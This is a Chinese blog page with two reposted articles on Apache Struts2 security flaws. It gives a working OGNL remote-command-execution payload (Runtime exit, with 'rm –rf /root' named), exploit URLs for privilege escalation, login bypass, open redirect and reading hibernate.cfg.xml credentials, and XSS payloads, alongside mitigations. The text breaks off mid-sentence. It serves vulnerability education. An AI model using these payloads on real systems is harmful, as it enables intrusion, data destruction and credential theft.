
<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>The 93 Page | It so life</title>
<meta name="author" content="RobinChia">

<meta name="description" content="It so life">


<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


<meta property="og:site_name" content="It so life"/>

<!--[if IE]><style>.testIE.IE{display:inline;}</style><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" href="/css/ie7.css" type="text/css"><![endif]-->
<!--[if (lt IE 9)&(gt IE 7)]><style>.testIE.IE8{display:inline;}</style><![endif]-->
<!--[if gt IE 8]><style>.testIE.IE9{display:inline;}</style><![endif]-->

<link href="/favicon.png" rel="icon">
<link rel="alternate" href="/atom.xml" title="It so life Feed" type="application/atom+xml">

<link rel="stylesheet" href="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/css/bootstrap.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/font-awesome/4.0.3/css/font-awesome.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/prettify/r298/prettify.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" type="text/css">
<link rel="stylesheet" href="/css/style.css" type="text/css">
<!--[if lt IE 9]>
   <style>article,aside,dialog,footer,header,section,footer,nav,figure,menu{display:block}</style>
   <script src="http://cdn.staticfile.org/html5shiv/r29/html5.min.js"></script>
   <script src="http://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
<link href="http://cdn.staticfile.org/respond.js/1.4.2/respond-proxy.html" id="respond-proxy" rel="respond-proxy" />
<link href="/js/respond.proxy.gif" id="respond-redirect" rel="respond-redirect" />
<script src="/js/respond.proxy.js"></script>
   <script src="http://cdn.bootcss.com/selectivizr/1.0.2/selectivizr-min.js"></script>
<![endif]-->
<script type="text/javascript">
function loadjs(c,d){var a=document.createElement("script");a.async=!0;a.type="text/javascript";a.src=c;a.charset=d||"gbk";(document.getElementsByTagName("HEAD")[0]||document.getElementsByTagName("BODY")[0]).appendChild(a)};
var _protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
var _js2load = [];
</script>

</head>
<body>
      <header id="header" class="container"><nav id="main-nav" class="navbar navbar-default navbar-fixed-top " role="navigation">
  <div class="container">
    <div class="navbar-header">
    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
      <span class="sr-only">Toggle navigation</span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </button>
    <a class="navbar-brand" href="/">It so life</a>
    </div>
    <div  class="collapse navbar-collapse">
      <ul  class="nav navbar-nav">
  
        <li><a href="/" title="Home">Home</a></li>      
        <li><a href="/about/" title="About">About</a></li>      
        <li><a href="/archives/" title="Archives">Archives</a></li>      
      <li class='dropdown'>
        <a class='dropdown-toggle' data-toggle='dropdown' href='#'>website<b class='caret'></b></a>
        <ul class='dropdown-menu pure-menu-selected'>
    
          <li><a href="//groups.google.com/forum/#!forum/pongba" title="TopLanguage">TopLanguage</a></li>    
          <li><a href="//itpub.net/" title="ITPub">ITPub</a></li>    
          <li><a href="//blog.jobbole.com/" title="Bole">Bole</a></li>    
          <li><a href="//nosql-database.org/" title="nosql">nosql</a></li>    
          <li><a href="//gitimmersion.googol.im/" title="Git">Git</a></li>    
        </ul>
      </li>
    
      </ul>
      <ul class="nav navbar-nav navbar-right">
      
        <li><a href="/atom.xml">RSS</a></li>
      
      
        <li><a href="https://twitter.com/robinchia">twitter</a></li>
      
      
      
      
        <li><a href="https://github.com/robinchia">github</a></li>
      
      </ul>
    </div>
  </div>
</nav>
<div class="clearfix"></div>
</header>
  <div id='content' class="container">
     <div class="page-header-wrapper">
      <!--[if lt IE 9]><div class="alert alert-warning alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button><strong>提示:</strong>您的浏览器版本太低了,建议升级到 <strong><a href="http://windows.microsoft.com/zh-cn/internet-explorer/download-ie" title="IE9">IE9</a></strong> 以上,本站使用<a href="https://www.google.com/intl/zh-CN/chrome/">Chrome浏览器</a>可以获得最好的显示效果.</div><![endif]-->
      <div class="page-header"><h1 align="center"><big>It so life</big> </h1>
        <h5 align="center"><big>love as life</big></h5>
      </div>
     </div>
     <div class="row">
       <div id="main-col" class="alignleft col-sx-12 col-sm-8 col-md-9 col-lg-9">
      <section id='header_widget'></section>
          <div id="wrapper"><article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-Java--Struts2-XWork安全漏洞及解决办法/">Struts2</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全-Java--Struts2-XWork安全漏洞及解决办法/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="struts2-xwork-">Struts2-XWork 安全漏洞及解决办法</h1>
<p> 作者  <em>my_corner</em>
    发表时间：2010-07-24   最后修改：2010-07-27</p>
<p>exploit-db网站在7月14日爆出了一个Struts2的远程执行任意代码的漏洞。
漏洞名称：Struts2/XWork &lt; 2.2.0 Remote Command Execution Vulnerability
相关介绍：</p>
<ul>
<li><a href="http://www.exploit-db.com/exploits/14360/" target="_blank">http://www.exploit-db.com/exploits/14360/</a></li>
<li><a href="http://sebug.net/exploit/19954/" target="_blank">http://sebug.net/exploit/19954/</a>
Struts2的核心是使用的webwork框架，处理 action时通过调用底层的getter/setter方法来处理http的参数，它将每个http参数声明为一个ONGL（这里是ONGL的介绍）语句。当我们提交一个http参数：
?user.address.city=Bishkek&amp;user[&#39;favoriteDrink&#39;]=kumys
ONGL将它转换为：
action.getUser().getAddress().setCity(&quot;Bishkek&quot;) action.getUser().setFavoriteDrink(&quot;kumys&quot;)
这是通过ParametersInterceptor（参数过滤器）来执行的，使用用户提供的HTTP参数调用 ValueStack.setValue()。
为了防范篡改服务器端对象，XWork的ParametersInterceptor不允许参数名中出现“/#”字符，但如果使用了Java的 unicode字符串表示\u0023，攻击者就可以绕过保护，修改保护Java方式执行的值：
此处代码有破坏性，请在测试环境执行，严禁用此种方法进行恶意攻击
?(&#39;\u0023_memberAccess[\&#39;allowStaticMethodAccess\&#39;]&#39;)(meh)=true&amp;(aaa)((&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003d\u0023foo&#39;)(\u0023foo\u003dnew%20java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)((&#39;\u0023rt.exit(1)&#39;)(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1
转义后是这样：
?(&#39;/#_memberAccess[&#39;allowStaticMethodAccess&#39;]&#39;)(meh)=true&amp;(aaa)((&#39;/#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=/#foo&#39;)(/#foo=new%20java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)((&#39;/#rt.exit(1)&#39;)(/#rt=@java.lang.Runtime@getRuntime()))=1
OGNL处理时最终的结果就是java.lang.Runtime.getRuntime().exit(1);
类似的可以执行java.lang.Runtime.getRuntime().exec(&quot;rm –rf /root&quot;)，只要有权限就可以删除任何一个目录。
目前尝试了3个解决方案：
<strong>1.升级到struts2.2版本。</strong>
这个可以避免这个问题，但是struts开发团队没有release这个版本（包括最新的2.2.1版本都没有release），经我测试发现新版本虽然解决了上述的漏洞，但是新的问题是strus标签出问题了。
<s:bean id="UserUtil" name="cn.com.my_corner.util.UserUtil"></s:bean> <s:property value="/#UserUtil.getType().get(cType.toString())" />
这样的标签在struts2.0中是可以使用的，但是新版中就不解析了，原因就是“/#”的问题导致的，补了漏洞，正常的使用也用不了了。
所以sebug网站上的建议升级到2.2版本是不可行的。
<strong>2.struts参数过滤。</strong>
<interceptor-ref name="params"> <param name="excludeParams">./<em>\u0023./</em></param> </interceptor-ref>
这个可以解决漏洞问题，缺点是工作量大，每个项目都得改struts配置文件。如果项目里，是引用的一个类似global.xml的配置文件，工作量相应减少一些。
<strong>3.在前端请求进行过滤。</strong>
比如在ngnix，apache进行拦截，参数中带有\u0023的一律视为攻击，跳转到404页面或者别的什么页面。这样做的一个前提就是没人把/#号转码后作为参数传递。
目前来看后两种是比较有效的方法，采用第三种方法比较简便。是否有另外的解决办法，欢迎大家讨论。
我并没有在windows环境下测试，有同学在windows下没有试验成功，这并不能说明windows下就没有风险可能是我们的参数或者什么地方有问题而已。既然漏洞的确存在，咱们就要重视对吧。欢迎大家测试，是否windows下漏洞不能执行成功。</li>
</ul>
<p>这三种方法，均已通过测试 </p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/Java/">Java</a></li></span></span> | <span class="tags">Tagged <a href="/tags/Java/" class="label label-primary">Java</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-29 22:31:34"datetime="2014-03-29 22:31:34"> mar. 29 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-Java--Struts2-XWork安全漏洞及解决办法/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-Java--Struts2-XWork安全漏洞及解决办法" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-Java--Struts2框架安全缺陷/">Struts2框架安全缺陷</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全-Java--Struts2框架安全缺陷/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h3 id="struts2-">Struts2框架安全缺陷</h3>
<p>By kxlzx</p>
<h3 id="-">摘要</h3>
<p>本文介绍了java开发流行框架struts2以及webwork的一些安全缺陷，并举例说明框架本身以及开发人员使用 框架时，所产生的种种安全问题，以及作者挖掘框架安全漏洞的一些心得体会。</p>
<h3 id="-">推荐以下人群阅读</h3>
<p>了解java开发 了解框架开发 了解web application安全 “网络安全爱好者”</p>
<h3 id="-">正文</h3>
<p>当前java开发网站，通常不会是纯JSP的，大都使用了java framework。 有了这些framework，让开发人员更加快速的开发出代码，也让代码非常具有可扩展性，那些分层架构的思想， 更是深入人心。这些也大大影响了安全代码审核，曾提出“分层审核代码”的思想，比如在DAO层专门检查 sql注入，在view层检查xss等。这些框架都有自己的层级，本次文章主要讲的是struts这个框架的相关 安全问题，也会有小部分涉及到struts后面的DAO层。 而struts这个框架更新占有市场份额极大的一个框架，它在各个层级中，位于如图所示位置： <img src="" alt=""> 可以看到struts在web应用中，负责处理接收用户数据，调用业务处理，以及展示数据的工作。所以本文把 struts的功能分为controller层和view层，controller层来完成接收用户数据，分发用户请求，而view专门 用于展示数据。 一个单独的struts，是不合逻辑的，因为架构师通常喜欢多种框架集合，让它们各自负责某一层的处理。 研究一个框架的安全问题，不能仅仅站在框架的角度，还应该充分考虑到开发人员是如何使用这些框架的， 他们最喜欢写什么样的代码，这样才能还原一个正常的、完整的web应用场景。 从搜索结果看，互联网中，绝大多数教程推荐struts+hibernate+spring这样的黄金组合，那么，我假设有 一个应用使用了这个组合，以struts为重点，站在攻击者的角度，层层分析struts的设计缺陷。</p>
<h3 id="struts2-">Struts2开发回顾与简单学习</h3>
<p>为了让大家回顾或者学习一下struts2，我们一起来建立一个action、jsp页面，做一个接收用户输入，之后 处理一下，再展示出来给用户的过程，精通struts2的同学可以跳过此步。 -------------------------------------struts回顾start 首先建立action，叫做AaaaAction： public class AaaaAction extends ActionSupport{ private String name; public String getName() { return name; } public void setName(String name) { this.name = name; } public String execute(){ System.out.println(&quot;exe&quot;); return SUCCESS; } public String bbb(){ System.out.println(&quot;bbbbb&quot;); return SUCCESS; } } 请注意execute这个方法，让用户输入action的地址后，默认会访问这个方法。 之后配置struts.xml文件 <action name="aaaaaaa" class="net.inbreak.AaaaAction"> <result name="success">user/aaa.jsp</result> </action> 配置这个文件后，当用户输入 <a href="http://www.inbreak.net/app/aaaaaaa.action">http://www.inbreak.net/app/aaaaaaa.action</a> 的时候，struts会负责让AaaaAction中的execute方法处理用户请求。 处理之后，该方法返回“return SUCCESS;”，struts又负责找到result的name是seccuess所指向的jsp页面。 把该页面解析后，返回给用户。 而用户看到的就是aaa.jsp页面的html代码。 struts2继承了webwork的所有优点，其实等于是webwork的升级，如果开发人员想让用户直接访问action中的 某方法，而不是访问默认的execute方法，只要定义一个方法叫做bbb，并且是public的，用户就可以直接输入 <a href="http://www.inbreak.net/app/aaaaaaa!bbb.action" target="_blank">http://www.inbreak.net/app/aaaaaaa!bbb.action</a> 直接访问了bbb方法。 那request中的参数如果接收呢？struts2中，这个过程被包装了起来，使用非常方便，只要在action中定义 一个属性，叫做public String name；。然后加入getName和setName方法，就可以像正常使用属性一样，接收到 用户传递过来的变量。无论是get请求还是post请求，都可以使用这种方式接收用户输入。 整个过程就如此简单，现在大家对流程有了了解，我们就开始讨论正文，如果还是想了解更多，请自行google。 ----------------------------------struts回顾end</p>
<h3 id="struts2-">Struts2安全缺陷</h3>
<p>可以看到struts2在数据流向方面，有两个重点，一个是进入（in），一个是输出（out）。而我在做漏洞 挖掘的思路，也是跟着这个数据的流程，开始分析的，下面我们就开始让数据进入。 Action属性默认值可以被覆盖缺陷： 在日常的java项目中，我们经常会遇到保存一个新的对象（比如注册一个用户），然后给这个对象赋予一些 用户提交上来的属性值，在这里，只需要定义一个对象类： public class User { private Long id=0l; private String name; private String pass; private Integer type=1; 。。。下面的get和set方法代码略 } 定义后，在action中，添加一个属性 User reguser; 用户注册的页面代码如下： <form XXXXXXX> <input name="reguser.name"> 当用户提交这个form到action中后，struts2会负责自动映射reguser.name的值到reguser的相关属性（name） 中，所以在execute这个方法中，就可以使用reguser.getName()拿到用户提交的reguser.name的值。所以我们 下面的代码就很简单了： public String execute(){ add(user); add方法，更简单了，因为我们项目中集成了hibernate，这个框架自动映射user类中的各个属性，自动组成 insert语句。我们只要在add中调用session.save(user);就可以保存用户到数据库中。 前文提到那么多“简单”两个字，难道这些过程都是安全的而他给我们仅仅带来了方便么？ struts2只负责映射所有对象，他提供了form验证，也只能验证form中属性值的内容，比如email格式等， 并不能约束用户提交其他属性上来，于是这就变成了十分危险的功能。 当User中有个属性type，代表User是否管理员时（1为普通用户，2为管理员），麻烦来了，攻击者在原来的 注册表单中，新加入一个input，叫做 <input name="reguser.type"> 然后输入值是2，把这个值一起交给action。在这个流程中，这个值，当然也会被自动带到数据库中，向下 处理的逻辑中，这个用户，就已经变成管理员了。 当你看到了一个struts2或者webwork的应用，可以尝试使用属性攻击，修改当前表单，里面有所有你猜测到 的属性，一并提交上来，就可能会影响整个逻辑，达到攻击目的。文中仅仅是一个例子，事实上，在数据传递 的过程中，可以任意覆盖数据的默认值，本来就是一个危险的缺陷，而struts2和webwork这两个框架仅仅看到 了它带来的好处，忽略了这方面基于安全性的考虑，仅仅关注了用户提交数据的正确性。对比在没有struts2 这个功能的时候，我们却需要在action中一个一个的把需要的变量，从用户提交的request中解出来，一个一个 处理，不可能出现这种安全问题。现在它包装了这个过程，自以为很方面，却出了严重问题。</p>
<h3 id="action-">Action中的方法被暴力猜解缺陷</h3>
<p>前文提到，有一种方法可以让用户访问action时，不访问默认的execute方法，而是直接访问其他action中 的方法，条件是在action中，写一个public的方法。开发人员如果需要做一个登陆后，展示所有用户列表的 功能，而他的一个“解耦合”的开发习惯，将在这里导致安全缺陷。 定义一个如下的action public class Userlogin extends ActionSupport{ private String uname=&quot;&quot;; private String upwd; private List list; //getter and setter 方法略 public String login(){ if(uname!=null&amp;&amp;upwd!=null&amp;&amp;uname.equals(&quot;kxlzx&quot;)&amp;&amp;upwd.equals(&quot;pass&quot;)) {//if login success return list(); } return false; } public String list(){ list.add(&quot;kxlzx&quot;);list.add(&quot;kxlzx1&quot;);list.add(&quot;kxlzx2&quot;);list.add(&quot;kxlzx3&quot;); return &quot;list&quot;; } } Userlogin中，因为list这个功能（显示所有用户列表），其实是一个通用的功能，很容易被其他地方调用， 所以开发人员把它单独写成了一个方法。 当用户登陆的时候，打开 <a href="http://www.inbreak.net/app/userlogin!login.action" target="_blank">http://www.inbreak.net/app/userlogin!login.action</a> 来到了用户的登陆页面，可以看到，只有用户输入正确的用户名和密码，才能最终调用list()方法，显示结果。 <img src="" alt=""> 但是struts2把所有public的方法都暴露了出去，导致现在用户输入了 <a href="http://www.inbreak.net/app/userlogin!list.action" target="_blank">http://www.inbreak.net/app/userlogin!list.action</a> 用户访问这个链接后，struts2调用list方法，然后返回结果给用户，所以没有登陆，就显示了所有用户信息， 直接绕过了login中的登陆验证。 <img src="" alt=""> 在没有struts2的时候，我们要在servlet的doget或者dopost方法中，写if判断等代码，才能让用户调用其他 servlet中的方法，现在看来其实这也是一种保护措施。而现在struts2为了方便开发，把所有的public方法 统一映射了出去，导致开发把一个经常使用的功能，习惯写成一个public的方法，现在居然成了严重漏洞。</p>
<h3 id="struts2-action-">struts2的action属性设计缺陷</h3>
<p>再回头看看我们在action中的属性定义，你会发现，现在他们都成了漏洞，因为struts2规定属性的get和 set方法，都必须是public的。 那么我们定义了 private String name; public String getName() { return name; } public void setName(String name) { this.name = name; } 这段代码的时候，实际上，是写了两个public的方法。 那这两个表面上没有任何实质含义的方法，会有什么安全隐患呢？ 这需要和前文联系起来，前文提到，我们在struts.xml文件中，定义如下： <action name="user" class="net.inbreak.UserAction"> <result name="success">user/userlist.jsp</result> <result name="addUser">user/addUser.jsp</result> <result name="added">user/added.jsp</result> <result name="false">user/false.jsp</result> </action> 这段代码含义是，UserAction中，任何一个方法执行后，如果返回的是success这个字符串， 就会把 user/userlist.jsp返回给用户。 如果返回是addUser，就会把user/addUser.jsp返回给用户。 现在UserAction是管理用户的页面，在我们的系统中，有普通管理员和超级管理员，他们的区别是普通管理员 可以查看用户，但是不能添加一个用户。 所以，我们在UserAction中，写了 public String addUser(){ if(true){ //事实上这里是个超级管理员的判断，我偷懒了。 return &quot;false&quot;; } return &quot;addUser&quot;; } 这个方法的代码判断了不允许普通管理员访问，但是user/addUser.jsp这个jsp页面中并没有这个判断逻辑。 因为开发认为只有返回addUser的时候，才会来到这个页面，而要返回addUser，则必须通过超级管理员的验证。 那我们能让一个方法返回addUser么？当然可以！ <a href="http://www.inbreak.net/app/user!getUsername.action?username=addUser">http://www.inbreak.net/app/user!getUsername.action?username=addUser</a> 这个链接，struts2会怎么处理呢？ 他会找struts.xml中，对应段路径user，于是找到了对应的处理Action（net.inbreak.UserAction）， 由于路径中有了“!getUsername”，于是就去找这个Action中的getUsername这个方法，很明显，这个方法其实 是username这个属性的get方法，如果你要让Action接收用户提交的username，你就必须要定义这个方法。 那这个方法会返回什么呢？会返回action的字段username的值！哈哈！username用户已经提交给action了， 链接后面写着“?username=addUser”，struts2把这个值赋予了action中的username属性。那这里返回的当然 就是“addUser”！ <img src="" alt=""> 一系列巧合后，导致现在给用户返回了user/addUser.jsp页面，这是一个添加用户的表单页面，并且用户没 有去走验证是否为超级管理员这一步。 现在用户看到了一个添加用户的页面，他有两种攻击思路： 1，直接提交，如果处理用户提交的那个action没有再次判断用户身份，那就提交成功了。 2，如果他判断了用户身份，我们还可以csrf他，因为我们知道了这个action的地址，和它需要的参数！ 由于struts2的action和jsp文件分离，导致开发人员往往会在action的方法中，执行权限判断，而jsp页面中 并没有再次执行这个判断，他以为action判断就够了。而偏偏action的属性，给我们带来了一个可自定义返回 result的方法，导致我们可以绕过action访问jsp页面。</p>
<h3 id="struts2-result-redirect-">Struts2的那些result类型缺陷（redirect）</h3>
<p>刚才我们领教了struts2给我们带来那些属性的好处，现在我们再往后走一步，研究Action方法的返回结果。 其实并不是只由String类型的返回结果，struts2还有其他类型的返回，比如“redirect”类型。 <action name="test" class="net.inbreak.TestAction"> <result name="false">user/false.jsp</result> <result name="redir" type="redirect">${redirecturl}</result> </action> 这段代码，大家唯一可能看不懂的，就是type=&quot;redirect&quot;了。 这是一个url redirect的方式，struts2为了方便大家开发，把“自定义302跳转到其他url”这种方式给包装了 起来。只要如上定义，我们就可以在action中写方法： public String redirect() { return &quot;redir&quot;; } 然后定义属性 private String redirecturl; 当用户打开 <a href="http://www.inbreak.net/app/test!redirect.action?redirecturl=/a.jsp">http://www.inbreak.net/app/test!redirect.action?redirecturl=/a.jsp</a> 的时候，就会302跳转到 <a href="http://www.inbreak.net/app/a.jsp" target="_blank">http://www.inbreak.net/app/a.jsp</a> 这是很常见的url跳转应用，在struts2中，如上配置一下，就可以实现。 相信明眼人都看出来了，很明显这里存在url跳转漏洞，如果用户输入了 <a href="http://www.inbreak.net/app/test!redirect.action?redirecturl=http://www.ph4nt0m.org" target="_blank">http://www.inbreak.net/app/test!redirect.action?redirecturl=http://www.ph4nt0m.org</a> 就会跳转到<a href="http://www.ph4nt0m.org这个钓鱼网站(-_-!)。那么如何防御呢？" target="_blank">http://www.ph4nt0m.org这个钓鱼网站(-_-!)。那么如何防御呢？</a> 要防御url跳转到钓鱼网站，我们肯定需要一个白名单机制，或者根本就让他跳转到本站下。于是有了如下判断： public String redirect() { if(redirecturl.startsWith(&quot;/&quot;)) { return &quot;redir&quot;; } return &quot;false&quot;; } 可能你看出来了，仅仅判断&quot;/&quot;开头，其实是不能杜绝url跳转漏洞的，因为 <a href="http://www.inbreak.net/app/test!redirect.action?redirecturl=//www.ph4nt0m.org" target="_blank">http://www.inbreak.net/app/test!redirect.action?redirecturl=//www.ph4nt0m.org</a> 一样会跳转。而在这里却足够了，因为struts2已经接管了这个过程，只要以“/”开头，统统先给你自动加上 本地域名，抓包后，你会看到 location: <a href="http://www.inbreak.net/app//www.ph4nt0m.org" target="_blank">http://www.inbreak.net/app//www.ph4nt0m.org</a> 实际上是不会有问题的。 struts2也认为这样判断不会有问题了，然而用户输入 <a href="http://www.inbreak.net/app/test!getStr.action?str=redir&amp;redirecturl=http://www.ph4nt0m.org" target="_blank">http://www.inbreak.net/app/test!getStr.action?str=redir&amp;redirecturl=http://www.ph4nt0m.org</a> <img src="" alt=""> 其实前篇已经分析过了，这样就利用action中的str属性，绕过了必须以“/”开头的判断，直接跳转了。 test里有个str属性，可自定义返回，这里自定义了“redir”，所以来到了 <result name="redir" type="redirect">${redirecturl}</result> 而redirecturl的值，也提交给了action，所以跳转了。</p>
<h3 id="struts2-result-ajax-">Struts2的那些result类型缺陷（Ajax）</h3>
<p>在struts2中使用ajax，也是被struts2支持的，它提供了一种返回类型，叫做“stream”。在研究这个 result的使用时，作者看到一本书，叫做《 Struts 2权威指南：基于WebWork核心的MVC开发 》。这本书非常 出名，几乎所有的struts2使用者都推荐使用。 <a href="http://book.csdn.net/bookfiles/479/index.html" target="_blank">http://book.csdn.net/bookfiles/479/index.html</a> 书上介绍ajax可以这么使用： 配置struts.xml <action name="ajaxtest" class="net.inbreak.ajax.TestajaxAction"> <result type="stream"> <param name="contentType">text/html</param> <param name="inputName">input</param> </result> </action> 之后写TestajaxAction： public InputStream input; public String execute() throws Exception{ input = new StringBufferInputStream(&quot;aaaa<td><script>alert(&quot;kxlzx&quot;)</script>aa&quot;); return SUCCESS; } 其实大家都看出来我的意思了，返回了contentType为“text/html”的页面，内容为 aaaa<td><script>alert(&#39;kxlzx&#39;)</script>aa 结果浏览器解析的时候，出现了XSS漏洞。 本来默认的contentType是text/plain，不需要配置，如果用户直接打开，只会看到一个Stream，不会解析 其中的html和js。现在书上介绍说要写成这样，不知道作者是否知道这个教程对大家的影响，结果已经误导了 大批的开发人员。 事实上，这不是struts的问题，是struts“权威”教程的问题。权威的教程，一旦出现安全漏洞，往往会 误导大批的开发人员，不知道大家在挖漏洞的时候，是否注意到了这点，特别是当官方的DEMO出现漏洞， 那绝对是惊天地泣鬼神的悲剧。</p>
<h3 id="struts2-result-">Struts2的那些result类型缺陷（自定的页面）</h3>
<p>有时候，开发人员为了方便，喜欢配置struts.xml如下： <action name="test" class="net.inbreak.TestAction"> <result name="success">user/test.jsp</result> <result name="testpro">user/testproperty.jsp</result> <result name="redir" type="redirect">${redir}</result> <result name="testloadfilepath">${testloadfilepath}</result> <result name="false">user/redirfalse.jsp</result> <result name="input">user/input.jsp</result> </action> 请注意，其中一条result，名称是”testloadfilepath”， ${testloadfilepath}的作用是自定义的jsp页面 地址，接收session或request中传过来的这个变量的值。那么用户提交 <a href="http://www.inbreak.net/app/test.action?testloadfilepath=user/test.jsp">http://www.inbreak.net/app/test.action?testloadfilepath=user/test.jsp</a> 当然就会返回user/test.jsp页面，非常的灵活。虽然并不是所有的开发都会这么做，但是一旦出现这种情况， 会产生什么问题呢？ <a href="http://www.inbreak.net/app/test!getRedir.action?redir=testloadfilepath&amp;testloadfilepath=WEB-INF/classes/hibernate.cfg.xml" target="_blank">http://www.inbreak.net/app/test!getRedir.action?redir=testloadfilepath&amp;testloadfilepath=WEB-INF/classes/hibernate.cfg.xml</a> 不知道大家看懂这段url的含义没有，先调用getRedir，可以自定义返回到testloadfilepath，而testloadfilepath 已经指定了WEB-INF/classes/hibernate.cfg.xml。WEB-INF目录下，都是受web容器保护的东西，默认不允许 直接request相对地址来访问。该目录里面有程序编译后的class文件（可以被直接反编译为java源码）， 有数据库配置文件等敏感文件，现在打开如上url，直接被下载了hibernate.cfg.xml，这里放着数据库用户名 和密码。 <img src="" alt=""> 这样，攻击者就可以下载你的所有源代码，所有服务器上的文件。struts在提供给我们这种方式的时候， 并没有任何官方说明这里有危险，这就是一个不定时炸弹。</p>
<h3 id="struts2-taglib-">Struts2的taglib设计缺陷</h3>
<p>经过几个例子下来，不知道大家注意到没有，从用户输入走到这里，已经走到了输出这一步了。struts2的 那些result的type，其实就是几种输出方式，有jsp、ajax、redirect，经过jsonplugin等插件配置，还可以 支持其他输出方式。甚至支持一些标签库，比如freemarker等标签库。不过我们只谈struts2自带的标签库， 在一个jsp页面的最上方，写上一段代码，就可以使用struts2提供的数据输出和页面数据操作的标签了。 比以往我们在jsp输出“&lt;%=name%&gt;”要方便的多，下面给个例子： test.jsp代码 &lt;%@ taglib prefix=&quot;s&quot; uri=&quot;/struts-tags&quot; %&gt; <s:property value="username"/> 第一行是告诉struts这里要使用struts的标签库，第二行就是一个标签的使用，含义是输出username的值， username会从session、request、page等地方取，这里不关注取数据的次序。</p>
<h3 id="struts2-taglib-struts2-0-escapejavascript-">struts2的taglib设计缺陷（struts2.0不支持escapeJavaScript）</h3>
<p>说到输出，大家都能想到XSS漏洞，那么作为一个流行框架，struts2在这里做了什么控制呢？ struts2.0对部分标签做了默认的htmlescape： 刚才那个标签实际上效果等于 <s:property value="username" escape="true"/> 别以为做了htmlescape就够了，输出在javascript中的时候，还会出现xss漏洞。所以struts在2.1.6这个版本 也支持了javascriptescape： struts2.1.6： <s:property value="pass" escape="true" escapeJavaScript="false"/> 默认开启如上所示，当你要输出到js中的时候，可以使用escapeJavaScript进行转义。 也就是说，一旦你确定这个struts是2.0的，只要开发人员把变量输出到js中，十有八九会出xss问题。</p>
<h3 id="struts2-taglib-">struts2的taglib设计缺陷（没有富文本安全输出标签）</h3>
<p>而包括最高版本2.1.8在内，仍然没有支持富文本安全输出，这是一件悲剧的事情，如果用struts开发一个 大众blog的应用，又支持富文本的文章，开发人员只能把htmlescape和jsescape都去掉，才能保证业务正常 运行，所以导致了XSS漏洞。</p>
<h3 id="struts2-taglib-htmlescape-">struts2的taglib设计缺陷（并不是所有输出标签都做了默认的htmlescape）</h3>
<p>有几个标签是不做htmlescape的，比如 <s:a> <s:text> <s:url> 这其实是一个严重陷阱，因为只要提到struts2，前辈们都会告诉你，放心使用，它默认做了htmlescape。 那是什么原因导致一些标签没有做默认的escape呢？作者翻了下源码，也没有找出具体原因，不知道那些人 是怎么想的。 并且，经过简单的fuzz，发现在特定环境下，那些做了输出转义的标签也会出现问题。 我们知道默认的htmlescape是不转义单引号的，所以，当struts标签库的源码中，出现一些标签属性的输出 时，如果标签属性的周围使用的是单引号，而攻击者又能控制标签属性内容的时候，就会出现xss漏洞。如下： <input name="username" onclick='xss'> 当这个xss的内容可以由攻击者控制，即使对xss的内容作了htmlescape，依然可以被攻击者bypass。 基于这个原理，作者搜索了struts标签库源码，那些“XXX.ftl”文件中搜索“}&#39;”符号，找到N多，测试 其中一个如下： ------------- <s:textfield >标签，在正常使用的时候，他会放到一个<s:form>标签内，最终输出html后，会变成一个输入框。 它有个属性叫“tooltip”，如果这个标签为用户可控制，比如从数据库中读取用户输入，而这个标签所在的 <s:form>开启了： <s:form tooltipConfig="/#{'jsTooltipEnabled':'true'}"> 的时候，用户输入的tooltip的值，会出现以下情况： struts2.0 --&gt; <span dojoType="tooltip" ... caption="kxlzx<script></script>"> caption内容就是tooltip的值，从数据库查出 struts2.1.6&amp;struts2.1.8 --&gt; <img onmouseover="domTT_activate(this, …'StrutsTTClassic');alert('xss');a('','styleClass’…" /> onmouseover生成一个domTT_activate函数调用，参数中其中一个值，是tooltip的内容。这里被bypass了。 ------------ 这些搜出的几个个地方实际上根本没有做任何escape，就直接输出了数据。下面那个即使做了默认的 htmlescape，还是会出问题，除非它默认做了javascriptEscape。struts2默认有地方做javascriptEscape么？ 答案是“没有”。所以，它们全都能被XSS！ <img src="" alt=""> struts2的这些escape，其实是一个很太监的安全方案，安全工程师最恨的就是这种方案，做了安全方案， 